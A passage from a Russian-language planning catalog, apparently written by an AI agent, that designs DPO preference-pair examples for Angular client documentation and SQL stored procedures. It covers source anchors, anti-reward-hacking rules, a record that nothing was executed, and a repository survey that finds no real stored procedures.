   `acceptance_signal_source != teacher_self_report` И `!= trained_unit_self_confidence`. КОНКРЕТНАЯ живая
   ловушка домена (та же, что PE-6.5 п.2): `DocumentationGeneratorOutput.Confidence`
   (`ProjectWikiDomainModels.cs:1126`+; вычисляется как `flags.Count/flags.Length` —
   `DocumentationGeneratorUnit.cs:43`) — self-report САМОГО юнита (доля заполненных секций) — НЕ смеет
   быть сигналом приёмки (тот же класс, что fixed-confidence ~0.35 `ProjectLocalWikiModelUnit`, `RAG-01`
   :252, R4-флаг). **Клиентское обострение ловушки:** `Confidence` меряет ЗАПОЛНЕННОСТЬ секций, а не
   ПРАВДИВОСТЬ — док N1 (false-presence) даёт `Confidence == Confidence` хорошего дока (все секции
   заполнены), т.е. self-report юнита СЛЕП ровно к главному измеренному дефекту. `Y_best`-selection
   классифицирован как детерминированный eval-only baseline (SI_GATE_6), не скрытая trainable-власть.
3. **Anti-reward-hacking (§1.3 п.7 (а)–(е) + доковая клиентская специфика):** (а) НЕ константный промпт
   — пары батча от ≥2 разных компонентов/флоу (FLOW-01 + FLOW-08) И разных поведенческих семей методов
   (submit / RTL `applyLanguage` / URL-парсинг constructor) — при однотипности 47 клонов это обязательное,
   не желательное; **(б) двусторонний doc length-hack — ОСТРЕЕ PE-6, обе формы инстанцированы:**
   false-absence-негативы (N4, живая `missing_*`-семья) систематически КОРОЧЕ chosen (секция/поведение
   удалено), false-presence-негативы (N1) — ДЛИННЕЕ chosen (предложение добавлено); батч из одной формы
   научит длину, не семантику — смешивание форм ОБЯЗАТЕЛЬНО; (в) НЕ confidence-leakage — числовое поле
   `Confidence` юнита в тексты сторон не попадает; (г) НЕ measurement circularity — held-out Q/A метрика
   приёмки (та самая, что дала `0.286`) не производная от train-строк (source-disjoint + Jaccard-guard,
   критичный при клонированном корпусе); (д) `chosen==rejected` → хард-гейт; **(е) mojibake-гейт —
   КЛИЕНТСКИ ОСТРЫЙ ВДВОЙНЕ:** русский текст секций дока (кириллица) + документируемые факты ВКЛЮЧАЮТ
   ивритские строки шаблона (`hebrewLabel` :142; he-ветки app.html) — порча ЛЮБОГО из двух скриптов в
   любой стороне пары = провал гейта (живой прецедент мойибейка в доменном корпусе — `RAG-02` манифест).
4. **`PromptError-05 Deterministic Shortcut` — предохранитель СКОРЕРА (не класс негатива):** сам
   `IndependentDomainScorer` НЕ смеет быть скрытым детерминированным лукапом, выдающим себя за
   trainable-судью — он eval-only детерминированный арбитр ПО ДИЗАЙНУ и назван так честно (не «обученный
   critic»); trainable-нога — это doc-юнит-СТУДЕНТ, который должен ЗАМЕНИТЬ шаблонную подстановку
   `DocumentationGeneratorUnit` выученной генерацией (allowed-level `ILogicalUnit`), а не скорер.
5. **Карантин-классы (§1.3 п.11):** privacy — доки/трассы ЧУЖОГО пользовательского клиент-кода →
   `PersonalAdaptive`/`.xiigen` до redaction+approval (`BLOCK_FOR_COMMON`, R-07/R-13); легальный —
   закрытая проприетарная teacher-модель → `DATASET_REBUILD_REQUIRED`; внешние Angular-doc корпуса
   two-layer плана → лицензионный гейт до импорта (`ANGULAR-DOCS` — `VERIFY_BEFORE_USE`, вне реестра 32 —
   перенос PE-5.4); ПЛЮС продуктовый paid-гейт этого прохода: клиент-doc строки → NOT-for-free-common
   (LegScope выше); secretPresence — док, цитирующий код-факт с реальным секретом → redaction до
   попадания в пару; демо-креды живого якоря (`'new.member@example.com'` :33 / `'local-demo-password'`
   :34) — синтетические, реальные пользовательские креды в строках пары запрещены; leakage —
   `ExcludedLeakageSignals` (все 6, PE-7.4) с доковой оговоркой про `source_path`.
6. **`margin > 0.05`** (иначе `LOW_CONTRAST`, plan-07 :520); слабый негатив → отбраковка предохранителем
   (§1.3 п.6), НЕ обучение.
7. **Честность статуса (`catalog != capability`):** каталог = plan-content; учитель Qwen3.5-9B / Ollama
   НЕ вызывался; НИ ОДНА `GraphDpoPair` НЕ построена (0 пар); grounding/coverage/terminology-чекеры,
   скорер и builder канона НЕ существуют — все capability-элементы **[условно от M1/M2]**; doc-pipeline
   над Angular-корпусом НИКОГДА не исполнялся (ни `ExecuteAsync`, ни батчи генератора — только чтение
   кода; ни одного Angular `ProjectDocumentationUnit` в коде не строилось); `Y_best`/`Y_goal`/`N1`–`N5` —
   АВТОРСКИЕ композиции (`SYNTHETIC_SEED`) ПО ФОРМЕ живого шаблона юнита (:54–:82) и живого компонента
   (spot-read якоря процитированы), НЕ выходы реального учителя и НЕ verbatim-копии файлов; evidence-ids
   `ev-01..ev-07` — АВТОРСКАЯ проекция трассы (якоря `app.ts`/`app.html` — VERIFIED живым ПОЛНЫМ re-read
   ЭТИМ пассом); absence-факты `ev-07` — свежий counted survey ЭТИМ пассом (47 каталогов src, 0
   файлов-хитов объединённым grep); числа `0.286`/`0.68` — из `RAG-02`-отчётов (.NET-корпус), ЭТИМ пассом
   не перемерялись и на Angular НЕ переносятся; overlap-значения — целевые by construction, НЕ измеренный
   `overlap_ratio`; порог `0.75` doc-гейта — концептуальный перенос PE-4.4, НЕ калиброванный; токен-оценки
   бюджета — аппроксимация; продуктовый код/тесты/git-write НЕ выполнялись. Уникальная доменная честность:
   клиентский док легко-grounded ровно ПОТОМУ, что корпус статичен — как только клиенты подключат API, и
   корпус, и сложность grounding изменятся (кавета-1 PE-7.4).

#### PE-7.6 Блок 6 — ИСТОЧНИК РЕАЛИЗМА (read-only цитаты с путями; VERIFIED = живой spot-read ЭТИМ пассом)

| Что обосновано | Источник (file:line) | Статус проверки этим пассом |
|---|---|---|
| Живой документируемый метод-якорь: `App.submitRegistration()` — две мутации сигналов (`journeyState.set('pending')` :99, `message.set('Registration is saved…')` :100), БЕЗ параметров, БЕЗ сети; imports без HttpClient :1–:3; сигналы :29–:36 (email :33 / password :34 / token :35 / message :36); standalone-декларация :21–:26; constructor URL-парсинг :57–:74; `applyLanguage`/RTL :121–:125; `hebrewLabel` :142–:152; демо-креды `'new.member@example.com'`/`'local-demo-password'` | `C:/Projects/xiigen-flows-dot-net-angular/flows/FLOW-01-user-registration/client/angular/src/app/app.ts:98–:101 (:99,:100)` + перечисленные окна (файл 169 строк) | VERIFIED (живой ПОЛНЫЙ re-read этим пассом) |
| Живой template-контракт метода: кнопка `data-testid="submit-registration" (click)="submitRegistration()"` :57; статус-блок `<section … role="status" data-testid="status-message">{{ message() }}</section>` :40; pending-ветка `@else if (journeyState() === 'pending')` :60 → «Check your email» :61 | `.../FLOW-01-user-registration/client/angular/src/app/app.html:40, :57, :60–:61` (файл 148 строк) | VERIFIED (живой ПОЛНЫЙ re-read этим пассом) |
| Версии стека документируемого юнита: `@angular/core ^21.2.0`, `rxjs ~7.8.0` (объявлен, в src не используется), `typescript ~5.9.2` | `.../FLOW-01-user-registration/client/angular/package.json:18, :22, :32` | VERIFIED (живой grep этим пассом) |
| СВЕЖИЙ counted survey статичности корпуса: 47 каталогов `flows/*/client/angular/src`; объединённый grep `HttpClient\|.subscribe(\|FormBuilder\|takeUntilDestroyed\|@angular/common/http\|from 'rxjs'` = **0 файлов**; **47 файлов используют `signal()`** | живой survey-grep ЭТИМ пассом (независимое повторение survey PE-5; grep ЖЁСТЧЕ — одним запросом покрыл транспорт+подписки+`takeUntilDestroyed`+rxjs-import; результат совпал: 0) | VERIFIED (живой counted grep) |
| Механика doc-конвейера языко-агностична: ветвление ТОЛЬКО `IsStoredProcedureUnit` :16 (`.sql`/@-параметры :50); generic 8-секционный шаблон :54–:82; 8 обязательных флагов ПРИСУТСТВИЯ :19–:29 (только omission ловит); warning `documentation_required_field_missing` :30; self-report `Confidence`=`flags.Count/flags.Length` :43; литерал шаблона `C# language version:` :78/:114 | `C:/Projects/llm_mvp_core/42.ProjectWikiDomain/DocumentationGeneratorUnit.cs:16, :19–:30, :43, :50, :54–:82, :78, :114` | VERIFIED (живой re-read этим пассом) |
| Записи домена с ТОЧНЫМИ живыми якорями: `DocumentationGeneratorOutput` (12 полей, №11 `Confidence`) :1126; `DocumentationGeneratorDpoPair(PairId,Unit,A,Chosen,Rejected,RejectedType)` :1140; `ProjectDocumentationUnit` (15 полей) :1561–:1576; **carrier-поле `CSharpLanguageVersion` :1570** (кандидат PE-10) | `.../42.ProjectWikiDomain/ProjectWikiDomainModels.cs:1126, :1140, :1561–:1576, :1570` | VERIFIED (живой read окна :1561–:1576 + grep этим пассом) |
| Живая rejected-таксономия — вся false-absence: switch 9 именованных `missing_*`-классов + default `partial_documentation` (**counted 10 веток, 0 false-presence**); `[WRONG:]` в rejected-тексте; `wrong_annotation_rate`-гейт :39; `missing_evidence` :83–:84 «cannot be cited or verified»; `.NET`-формулировка `missing_stack_version` :82 | `.../42.ProjectWikiDomain/DocumentationGeneratorDpoGenerator.cs:39, :77–:96 (:77/:79/:81/:83/:85/:87/:89/:91/:93/:95)` | VERIFIED (живой re-read этим пассом — counted 9 именованных + default) |
| Клиентская нога домена ЖИВАЯ: `IsClientEvidence` (.ts/.js/Angular/React/client) :152; cross-stack секция «Client path…» + честный `missing … client component/service evidence` :115 | `.../42.ProjectWikiDomain/ProjectLocalWikiModelUnit.cs:115, :152` | VERIFIED (живой read этим пассом) |
| Маршрут/оркестратор/честный runtime-вердикт `runner_missing` (переиспользование якорей PE-6 без повторного полного чтения ЭТИМ пассом) | `ProjectDocumentationPipelineFlowAdapter.cs:9–:10, :46–:48, :68`; `ProjectDocumentationPipelineOrchestrator.cs:129` — PE-6.6 строки 1–2 | CITED (якоря PE-6 VERIFIED-в-этом-файле; сами файлы ЭТИМ пассом не перечитаны) |
| Измеренный провал base-модели доков (`0.286`/`0.68`) — .NET wiki-корпус; диагноз hash-token раннер + отсутствующий `ProjectWikiQueryPlanningFlow`; Multi-Language English promoted / TS PENDING; приоритет SQL→Angular; «`IsClientEvidence` уже есть в коде» | `RAG-02-orchestrator-extension.md:22, :932, :954` | CITED (числа из RAG-02, ЭТИМ пассом не перемерялись; :253–:255 THE-пробел — VERIFIED в PE-6) |
| Free=.NET / Paid=Angular монетизационный сплит (`LicenseManager`/`DomainLoader`/CDN; приватный репо `xiigen_smart_domains`); per-stack `PLAN-WIKI-TRAINING-ANGULAR-v1`; AngularJS — НАМЕРЕННО отдельный домен (обоснование N5); wiki-evidence о ДОЛЖНОМ клиентском wiring | `RAG-02-orchestrator-extension.md:18, :468, :855, :860, :933` | CITED (владелец карты §3; VERIFIED живым grep в PE-5.6 :2140–:2141) |
| 14 полей `GraphDpoPair` (канон пары, owner блок 07) | `active-codex-execution-plan-07-dpo-builder.md:246–:261` (через §1.4 каталога) | VERIFIED (владелец §1.4; reward-секция читана живьём в PE-6) |
| Reward-scalarization: `reward(side)=Beta·(policyLogP−referenceLogP)` + `margin` + `preference_score`-only + `REWARD_EXTRACTOR_MISSING` | `active-codex-execution-plan-07-dpo-builder.md:341–:360` | VERIFIED (живой read в PE-6; через §1.4/§1.1) |
| Bounded teacher-call Шаг 3a + budget num_ctx≈8192 + `k_generations=4` + `TeacherProvenanceAdapter` + acceptance-independence + Y_best determinism | `active-codex-execution-plan-09-auto-dpo-loop.md` §Шаг 3a :492–:502, :497–:498, :504–:544 | CITED (владелец каталога §1.1; PE-3 VERIFIED live; этим пассом через §1.1/§1.4) |
| Профиль учителя `qwen35-local-v1` (num_ctx≈8192, local self-hosted open-weight) + `TeacherProvenance` 20 полей | `active-codex-execution-plan-08-legal-teacher-gate.md` §3.5.2 :779–:833, §3.1 :389–:409 | CITED (владелец каталога §1.1/§1.4; этим пассом не перечитан) |
| `TP1_LOCAL` eval/quarantine до `G-DPO-FINAL` (`DpoTrainReady=false`, нет `TrainBatchAsync`) | `active-codex-execution-two-phase-local-remote-overlay.md:48–:53` | CITED (владелец каталога карта; PE-2..PE-6 VERIFIED live) |
| Секция-источник переноса (перенос с переякориванием) | `PLAN-VS-VSCODE-CONTINUE-v1.md:5200–:5458` (проход PE-7 Fable) | VERIFIED (живой read этим пассом) |
| Клиентские живые якоря, LegScope Paid-обоснование, `ANGULAR-DOCS` VERIFY_BEFORE_USE, статичность корпуса | этот каталог PE-5.1/PE-5.4/PE-5.6 (`:1683–:1750`, `:2130–:2155`) | VERIFIED (в этом же файле) |
| Evidence-grounding дифференциал (первичный гейт), доковая рамка overlap, false-presence/false-absence различение, `Confidence`-ловушка, THE-пробел false-presence в сиблинг-юнитах | этот каталог PE-6.3–PE-6.6 (`:2522–:2755`) | VERIFIED (в этом же файле) |
| «Documentation follows code» (класс сиблинга) + «Project wiki domain» (`runner_missing`) + R6 SIMPLE AGENT BOUNDARY (тонкий клиент) + Rule 2 DNA fabric-first; privacy R-07/R-13 | `llm_mvp_core/CLAUDE.md` — «Documentation follows code», «Project wiki domain», R6, «The 10 Rules» | CITED (родственный репо; секция «Project wiki domain» сверена с живым кодом домена в PE-6) |

#### PE7-ЛОГ — Что добавлено + счётчики + честность

1. **Добавлено (append-only):** эта секция «Prompt-Examples проход PE-7/10 — Задача 6 — Клиентская
   документация» (блоки 1–6); обновлена ОДНА строка статус-таблицы §5.2 (Клиентская документация →
   ЗАПОЛНЕНО PE-7, маркер `[FIX-PE-7]`) и front-matter `pass` + `pass_pe7_fill` (single-owner FC-44:
   заголовок и строка статуса свипнуты в ОДНОМ шаге, `stale-status-carrier` исключён). Прочий старый
   текст НЕ переписан; carrier-находка `CSharpLanguageVersion` :1570 записана observation'ом (кандидат
   PE-10), НЕ правкой.
2. **Счётчики — БЕЗ изменений:** WO 53 / решения 26 / ветки 55 / связи 21 / M5=46 — каталог =
   plan-content, не work-order; реального нового WO проход не создал (движение счётчика возможно только в
   PE-10). `readiness` плана (`PLAN_NOT_READY`) НЕ тронут; PLAN-ONLY.
3. **Пакет честности:** изменён ТОЛЬКО этот файл. Примеры — ПЛАНОВЫЕ ОБРАЗЦЫ: Ollama/учитель НЕ
   вызывался; НИ ОДНА `GraphDpoPair` НЕ построена (0 пар); grounding/coverage/terminology-чекеры, скорер,
   builder и обучаемый doc-юнит канона в коде НЕ существуют; doc-pipeline над Angular-корпусом НИКОГДА не
   исполнялся (только чтение кода); `Y_best`/`Y_goal`/`N1`–`N5` — АВТОРСКИЕ композиции (`SYNTHETIC_SEED`)
   ПО ФОРМЕ живого шаблона юнита и живого компонента, НЕ выходы реальных моделей и НЕ verbatim-копии;
   числа `0.286`/`0.68` — из `RAG-02` (.NET корпус), не перемерялись, на Angular НЕ переносятся;
   overlap-значения — целевые by construction, НЕ измеренный `overlap_ratio`; порог `0.75` doc-гейта —
   концептуальный перенос PE-4.4, НЕ калиброванный; токен-оценки бюджета — аппроксимация; продуктовый
   код/тесты/git-write НЕ выполнялись. **Против образца-Fable этот проход богаче на counted spot-read И
   строже по канону:** (а) ОБЪЕДИНЁННЫЙ survey-grep одним запросом покрыл `HttpClient`+`.subscribe(`+
   `FormBuilder`+`takeUntilDestroyed`+`@angular/common/http`+`from 'rxjs'` (образец survey'ил
   `HttpClient|subscribe(|FormBuilder`) — VERIFIED 0 хитов + 47 файлов `signal()`; (б) carrier-mismatch
   `CSharpLanguageVersion` подтверждён ТОЧНОЙ строкой :1570 живым read записи (образец давал :1570 без
   показа записи); (в) **flip `DpoTrainReady` `true→false`** (образец-Fable ставил `true` — у нас это
   `dual-live-canon` статуса готовности, FC-44, с двумя клиентскими каветами + глобальными execution-гейтами);
   (г) все 6 `ExcludedLeakageSignals` (образец нёс 5, терял `source_id`); (д) живой re-read
   `.cs`-механики домена ЭТИМ пассом (`DocumentationGeneratorUnit`/`ProjectWikiDomainModels`/
   `DocumentationGeneratorDpoGenerator`/`ProjectLocalWikiModelUnit`) — counted 10 rejected-веток
   подтверждён независимо. Spot-read ≠ полное чтение: из 47 клиентов полностью читан 1 (FLOW-01: `.ts`+
   `.html`), FLOW-08 в этом пассе НЕ перечитывался (якорь унаследован от PE-5 как evidence);
   `ProjectDocumentationPipelineFlowAdapter`/`Orchestrator` ЭТИМ пассом не перечитывались (якоря PE-6
   переиспользованы с пометкой CITED). Негативы покрывают 5 классов (3 доменно-локальных: N1 false-presence
   переиспользован из PE-6 + N4 false-absence НОВЫЙ + N5 framework-terminology НОВЫЙ; 2 канонических
   `ORCH-02`/`PromptError-11`); `PromptError-09`/`PromptError-12` не инстанцированы (покрыты PE-6 N4/N5,
   та же ось); живые 10 omission-веток генератора отдельными N не дублировались (существующий seed);
   полный баланс классов = обязанность DPO-build. Валидация прохода = Opus 4.8 (родитель) ДО старта PE-8
   (хранимые процедуры).

---
*Конец прохода PE-7/10. PE-8 (Хранимые процедуры) стартует после валидации Opus 4.8 этого прохода.
Канон-переключение PE-8 (нота для следующего прохода): домен = SQL-слой xiigen (по сплиту `RAG-02` SQL —
именованный отдельный Paid-домен), `Level=unit`, `NodeOrEdgeId=stored-proc/<база>/<процедура>`; ГЛАВНЫЙ
ЧЕСТНЫЙ ДОЛГ (§4 п.1) — 0 реального корпуса: counted spot-scan 4 репо не нашёл реальных хранимых процедур
(`CREATE PROC`/`CREATE PROCEDURE` в src не найдены; единственный tracked `*.sql` — схема без процедур;
живая платформенная абстенция `ABSTAIN_NO_SOURCE`), поэтому PE-8 обязан ЛИБО найти реальные процедуры,
ЛИБО честно строить примеры от контракта (`SYNTHETIC_SEED`-forward генератора 42-домена), записав это;
real-corpus unlock = static `.sql` ЛИБО consent-gated извлечение (`ISqlConsentGate`, default DENY);
`DpoTrainReady=false` [условно от M1 + G-DPO-FINAL] + source-кавета; таксономия — `PromptError-01..12` +
доменно-локальные SQL-коды (задаёт PE-8); скорер — синтаксис-валидность + контракт вход/выход +
идемпотентность/транзакционность; ЖИВОЙ мост доступен: SQL-семья doc-генератора (`missing_sql_parameters`/
`missing_sql_result_shape`/`missing_sql_side_effects`/`missing_dotnet_callers`/`missing_stored_procedure_identity`,
DpoGenerator :85–:93) — готовый omission-seed для SP-документирования, но САМА способность генерировать/
исполнять процедуры = долг.*

---

## Prompt-Examples проход PE-8/10 — Задача 7 — Хранимые процедуры (SQL) (`42.ProjectWikiDomain` SP-ветка + REFERENCE-архитектура `Sql/`)

**[FIX-PE-8]** **Дата:** 2026-07-14. **Автор:** Opus 4.8 (Ultracode), одиночный
bounded architect-author прохода PE-8/10 (PLAN-ONLY, R2: ни продуктового кода, ни тестов, ни
ollama, ни git-write; НИ ОДНА БД НЕ открывалась; правился ТОЛЬКО этот файл; наш план 07/08/09/overlay,
`RAG-02`/`RAG-07` и живой код `42.ProjectWikiDomain` в `llm_mvp_core` + 4 доступных xiigen-репо читались
read-only). **Авторитет:** живая unquoted-директива Luba 2026-07-13 (каталог примеров промптов
positive/negative под 8 задач, «в соответствии с реализацией», переносом из плана-источника с
переякориванием на наш канон) + вердикт Opus 4.8 на PE-7 — VALID. Содержание = заполненный шаблон §2.1
для задачи 7 «Хранимые процедуры (SQL)». Перенос из секции-источника «Prompt-Examples проход 8/10
(Fable)» (`PLAN-VS-VSCODE-CONTINUE-v1.md` :5462–:5707): ярлыки источника `PE-1.4/PE-1.5/2PH-2.x/2PH-3.x`
переякорены на наши блоки 07/08/09 + overlay + §1–§5. Второй канон НЕ создаётся.

**Канон-переключение против образца-Fable (по праву §2.3 + CARRY PE-7→PE-8 + СОБСТВЕННЫЙ counted
spot-scan ЭТИМ пассом):**
- **(а) Тип задачи = КОД-задача (как PE-4/PE-5: сгенерировать/улучшить хранимую процедуру), НЕ
  док-задача.** Единственная ЖИВАЯ SQL-ветка кодовой базы — ветка ДОКУМЕНТИРОВАНИЯ SP в 42-домене
  (PE-6/PE-7-семья): `IsStoredProcedureUnit` (`DocumentationGeneratorUnit.cs:50–:52`, применение :16–:18),
  отдельный SP-промпт с 5 counted осями (`DocumentationGeneratorDpoGenerator.cs:66–:71`), 5 counted
  SQL-rejected классов (:85–:93) и синтетический SP-корпус (`BuildStoredProcedureUnits` :293–:327). Она
  используется как ЖИВОЙ SEED-МОСТ формы процедуры и как источник имён живой таксономии, там где их
  семантика мапится в код-дефект, БЕЗ переименования (no dual-canon).
- **(б) ГЛАВНЫЙ ЧЕСТНЫЙ ДОЛГ §4 п.1 отработан СОБСТВЕННЫМ counted spot-scan ЭТИМ пассом — и результат
  СТРОЖЕ образца-Fable:** реальных хранимых процедур НЕТ ни в одном из 5 доступных репо (PE-8.1 таблица);
  `xiigen mvp` (репо, где образец-Fable нашёл `outbox.schema.sql`) на этой машине ОТСУТСТВУЕТ → его
  claim записан CITED-not-verified, а не как перепроверенный факт. Живая платформенная абстенция
  `ABSTAIN_NO_SOURCE` подтверждена перечитыванием теста. **SOURCE_STATUS = `SYNTHETIC_SEED`-forward**
  (легально в код-домене, как API-wiring PE-5 и SQL-образец Fable): примеры строятся ПО ФОРМЕ живого
  синтетического SP-контракта генератора, поведение НЕ выдумывается сверх контракта seed; способность
  генерировать/исполнять реальные процедуры = записанный долг (PE-8.5 п.6).
- **(в) Таксономия негативов = `PromptError-01..12` + доменно-локальные SQL-коды (§3 строка 7), с ДВУМЯ
  явными формами презентационной оси, инстанцированными ОБЕ (перенос инсайта PE-6/PE-7 на SQL):**
  **FALSE-PRESENCE** (`sql_hallucinated_parameter` — НОВЫЙ доменно-локальный: процедура объявляет ВХОД,
  которого НЕТ в контракте; зеркало живого `missing_sql_parameters`, ОТСУТСТВУЮЩЕЕ в живой таксономии —
  как `doc_hallucinated_claim` PE-6) и **FALSE-ABSENCE** (`missing_sql_side_effects` — ЖИВОЙ канон-код
  :89–:90 переиспользован БЕЗ переименования: процедура ПРОИЗВОДИТ незадекларированный write, но
  контракт side-effects об этом МОЛЧИТ; descriptive-имя задачи `sql_omitted_side_effect` мапится на этот
  живой канон, FC-44 no-dual-canon) — пара N1↔N2 = намеренный КОНТРАСТ false-presence↔false-absence.
  Плюс `sql_injection_unsafe_concat` (доменно-локальный security; RAG-07 `sqlInjectionArbiter` — ОСЬ
  СКОРЕРА, не код негатива, single-owner FC-44) + 2 канонических кода строк 5/6 карты (`ORCH-02 Missing
  Evidence` + `PromptError-11 Vague Deliverables`).
- **(г) LegScope = `PersonalAdaptive` (Paid=SQL) — как образец-Fable, но с явным двойным основанием:**
  лицензионный сплит `RAG-02` :18 (платные = Angular/AngularJS/Java/**SQL**) + privacy-обострение
  (реальные SP существуют ТОЛЬКО в пользовательских БД за consent-гейтом `ISqlConsentGate` default DENY).
- **(д) `DpoTrainReady=false` [условно от M1 + G-DPO-FINAL] — ФЛИП против образца-Fable (тот ставил
  `true`):** как PE-2..PE-7, наш каталог требует `false` до `G-DPO-FINAL` для ВСЕХ задач, иначе
  `dual-live-canon` статуса готовности (FC-44). У SQL-домена нет Phase-0-блока класса `TOKENIZER_BLOCKED`
  (T-SQL — латиница), НО держат `false`: (1) builder/scorer/T-SQL-парсер НЕ существуют [условно от M1];
  (2) REAL-корпуса SP НЕТ (counted 0 ЭТИМ пассом) → `SYNTHETIC_SEED`-forward с source-каветой;
  (3) глобальный `G-DPO-FINAL`.

### Задача 7 — Хранимые процедуры (SQL) (`42.ProjectWikiDomain` SP-ветка + REFERENCE `Sql/`)

#### PE-8.1 Блок 1 — ДОМЕН РЕАЛИЗАЦИИ + адресация пары + результат counted spot-scan SQL-источника

По-человечески: задача 7 — пользователь расширения VS/VS Code просит «улучши эту хранимую процедуру» или
«сгенерируй процедуру по контракту»; конвейер стадий маршрутизирует запрос к обучаемому SQL-юниту,
который обязан выдавать процедуру В КОНТРАКТНОЙ РАМКЕ (identity, параметры, форма результата,
задекларированные side-effects), а не «просто работающий SQL». Владелец-домен (карта §3 строка 7) —
SQL-слой xiigen-систем (по сплиту `RAG-02` SQL — именованный отдельный Paid-домен); будущий код-дом по
реализации — `42.ProjectWikiDomain/Sql/` (архитектура REFERENCE, кода НЕТ:
`ISqlConnectionExtractor`/`ISqlConsentGate`/`ISqlObjectExtractor`/`SqlWikiDocumentationOrchestrator` —
`RAG-02` :859); уже ЖИВАЯ SQL-ветка — SP-ветвление doc-домена (см. мост ниже).

**Counted spot-scan SQL/SP-источника (СОБСТВЕННЫЙ свип ЭТИМ пассом, VERIFIED; закрывает долг §3 строки 7
/ честной ноты :331(а); гейт claim-verification «посчитанные тоталы»):**

| Репо (доступный на этой машине) | tracked `*.sql` (`git ls-files`) | `CREATE PROC(EDURE)` — определения в src | текстовые хиты `CREATE PROC` (классификация) |
|---|---|---|---|
| `xiigen-flows-dot-net-angular` | **0** | **0** | 0 |
| `xiigen-flows-dot-net-angular-DpoImplementation` | **0** | **0** | 0 |
| `xiigen-platform-dot-net-angular` | **0** | **0** | 2 — ОБА в `SmartWikiServiceTests.cs:140–:141` (живая АБСТЕНЦИЯ, УТВЕРЖДАЕТ отсутствие SP) |
| `xiigen-platform-dot-net-angular-DpoImplementation` | **0** | **0** | 2 — те же (зеркало-репо) |
| `llm_mvp_core` | **0** | **0** | 2 — ОБА в `Tests/ProjectWikiDomainTests.cs:2532,:2613` (СИНТЕТИЧЕСКИЕ тест-фикстуры `CREATE PROCEDURE [dbo].[GetOrderTotals]` — вход теста SP-doc таксономии, НЕ продуктовая процедура) |

Дополнительно ЭТИМ пассом: `find -iname "*.sql"` по всем перечисленным репо = **0 файлов** (ни одного
`*.sql` на файловой системе, ни tracked, ни untracked); `DbContext`/EF code-first в `xiigen-flows` = **0**
(нет и EF-маршрута к БД).

**Вердикт локации (честный, СТРОЖЕ образца-Fable):** реальных хранимых процедур НЕТ ни в одном из 5
доступных репо — и это не пробел свипа, а ЗАПИСАННЫЙ ФАКТ самой платформы: SmartWiki-тест platform-репо
несёт живую абстенцию `SmartWikiAbstention("SQL stored procedures", "ABSTAIN_NO_SOURCE", "No CREATE
PROCEDURE, CREATE PROC, stored procedure or DbContext source exists for FLOW-19.", "rg …")`
(`SmartWikiServiceTests.cs:137–:141`, перечитан ЭТИМ пассом). Единственные текстовые хиты `CREATE PROC`
во всех 5 репо — это ЛИБО сама абстенция (её отрицательный текст), ЛИБО синтетические тест-фикстуры; ни
одного продуктового определения процедуры. **Расхождение с образцом-Fable (честное):** образец нёс строку
`| xiigen mvp | 1 — outbox.schema.sql (0 процедур) |` — репо `xiigen mvp` (React-клиент) на ЭТОЙ машине
ОТСУТСТВУЕТ (`ls /c/Projects` его не содержит, `find` не нашёл `outbox.schema.sql`), поэтому его «1 tracked
схема-файл без процедур» записан CITED-not-verified (PE-8.6), а не как перепроверенный факт — вывод «0
реальных SP» от этого лишь усиливается. Применяется by-construction кавета `RAG-02`: default домена =
static `.sql`-file parsing в репозитории (:955; таких файлов с процедурами сейчас 0), извлечение SP из
ЖИВОЙ БД — строго consent-gated per-database (`ISqlConsentGate` default DENY :955; `RAG-02` :858).

**ЖИВОЙ SEED-МОСТ формы процедуры (VERIFIED полным re-read генератора ЭТИМ пассом) —** синтетический
SP-корпус `BuildStoredProcedureUnits` (`DocumentationGeneratorDpoGenerator.cs:293–:327`): имена
`dbo.Get{Имя}{N}` (:303), путь `Database/StoredProcedures/{procName}.sql` (:311), meaning-строка
reads/writes/read-committed + audit (:317), параметры `@EntityId:uniqueidentifier <- entityId` /
`@IncludeInactive:bit <- includeInactive` (:318), result set `Id, Name, Status, Total, UpdatedUtc` (:319),
10 train-имён (`OrderTotals..SurveyAnswers` :297) vs 10 heldOut-имён (`InvoiceAging..SessionCleanup` :296)
= дизъюнктные семьи; corpus-id `generic-dotnet-sql-docs` (:309), первопартийный training-root
`C:/training/generic-dotnet-sql-docs` (:310). Поэтому примеры прохода — `SYNTHETIC_SEED`-forward:
авторская композиция ПО ФОРМЕ живого синтетического контракта, поведение SP не выдумывается сверх
контракта seed; честная пометка — PE-8.5 п.6.

**SOURCE_STATUS этого прохода:** `SYNTHETIC_SEED` (не `ABSTAIN_NO_SOURCE`). Обоснование выбора: живой
код-домен НЕСЁТ типизированный SP-контракт-seed (:317–:319) и живую SQL-таксономию (:85–:93) — форма
процедуры и оси дефектов ОБОСНОВАНЫ живым кодом, а не выдуманы; поэтому легальный `SYNTHETIC_SEED`-forward
(как PE-3/PE-5 в код-домене), а НЕ `ABSTAIN`. При этом ЖИВАЯ платформенная поза для реальных БД-процедур
остаётся `ABSTAIN_NO_SOURCE` (:140) — это не противоречие: seed питает ФОРМУ, реальный корпус остаётся
долгом до static-`.sql` ЛИБО consent-extraction.

Адресация пар (канон блока 07 — `GraphDpoPair.Level` / `NodeOrEdgeId`, §1.4):
- **`Level="unit"`** (train-ready ОБЯЗАН быть `"unit"`, plan-07 :248) — единица = ОДНА короткая процедура
  в жёсткой контрактной рамке, НЕ node/edge-план.
- **`NodeOrEdgeId="stored-proc/generic-dotnet-sql-docs/dbo.GetOrderTotals0"`** — паттерн карты §3 строки 7
  (`stored-proc/<база>/<процедура>`); `<база>` = живой синтетический corpus-id `generic-dotnet-sql-docs`
  (зеркало живого unit-id `generic-dotnet-sql-docs::dbo.GetOrderTotals0` :306/:303); после
  consent-extraction реальных БД `<база>` станет реальным именем БД — PersonalAdaptive-нога.
- **LegScope: `PersonalAdaptive` (Paid=SQL) по ДВУМ основаниям:** (а) лицензионный сплит `RAG-02` :18 —
  платные домены = Angular/AngularJS/Java/**SQL** (сплит «механика-vs-строки» PE-7: 42-конвейер free по
  имени, СПОСОБНОСТЬ работать с SQL — платная); (б) privacy-обострение, уникальное для SQL: реальные
  процедуры существуют ТОЛЬКО в пользовательских БД и приходят через consent-gated извлечение (:858) →
  строки от реальных БД = `PersonalAdaptive`/`.xiigen` by construction до redaction+approval; сам
  синтетический seed — первопартийный (`C:/training/generic-dotnet-sql-docs` :310), лицензионного трения
